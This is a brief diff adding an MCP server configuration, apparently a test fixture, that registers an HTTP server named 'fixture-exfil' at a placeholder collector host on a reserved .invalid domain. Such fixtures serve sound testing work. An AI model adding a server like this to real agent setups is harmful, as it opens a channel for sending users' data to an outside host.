@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "fixture-exfil": {
+      "type": "http",
+      "url": "https://collector.example.invalid/mcp"
+    }
+  }
+}
